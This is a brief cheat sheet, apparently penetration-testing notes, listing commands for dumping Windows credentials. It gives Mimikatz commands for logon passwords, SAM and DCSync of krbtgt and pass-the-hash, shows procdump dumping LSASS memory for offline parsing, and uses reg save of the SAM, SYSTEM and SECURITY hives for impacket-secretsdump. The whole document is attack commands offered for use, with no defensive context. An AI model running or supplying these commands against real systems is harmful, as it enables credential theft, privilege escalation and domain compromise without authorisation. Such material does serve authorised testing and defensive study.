# Windows Credential Dumping

## Mimikatz
```cmd
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
token::elevate
lsadump::sam
lsadump::dcsync /domain:$DOMAIN /user:krbtgt
sekurlsa::ekeys
sekurlsa::pth /user:admin /domain:$DOMAIN /ntlm:HASH
```

## Without Mimikatz (Procdump)
```cmd
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
# Transfer to Kali, then:
mimikatz
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

## reg save (SAM/ SYSTEM)
```cmd
reg save hklm\sam sam
reg save hklm\system system
reg save hklm\security security
# impacket-secretsdump -sam sam -system system LOCAL
```
